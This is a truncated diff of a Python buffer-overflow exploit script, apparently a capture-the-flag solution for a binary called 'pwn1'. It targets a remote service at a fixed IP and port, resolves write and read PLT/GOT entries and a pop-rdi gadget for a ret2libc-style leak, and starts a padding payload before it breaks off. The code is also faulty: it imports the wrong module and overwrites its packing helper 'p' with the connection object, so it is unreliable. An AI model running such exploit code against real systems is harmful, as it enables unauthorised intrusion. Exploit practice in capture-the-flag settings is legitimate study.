import _struct
+
+
+def p(x):
+    return _struct.pack("<Q", x)
+
+
+def u(x):
+    return _struct.unpack("<Q", x)[0]
+
+
+def main():
+    #  p = process("./pwn1")
+    p = remote("123.206.31.85", 8888)
+    elf = ELF("./pwn1")
+    libc = ELF("libc.so.6")
+    context.log_level = "debug"
+    main_addr = elf.symbols.main
+    write_plt = elf.plt["write"]
+    read_plt = elf.plt["read"]
+    write_got = elf.got["write"]
+    read_got = elf.got["read"]
+    pop_rdi_ret = 0x4006b3
+    p.recvuntil("buffer:")
+
+    payload = "A" * 0x30
+    payload += p
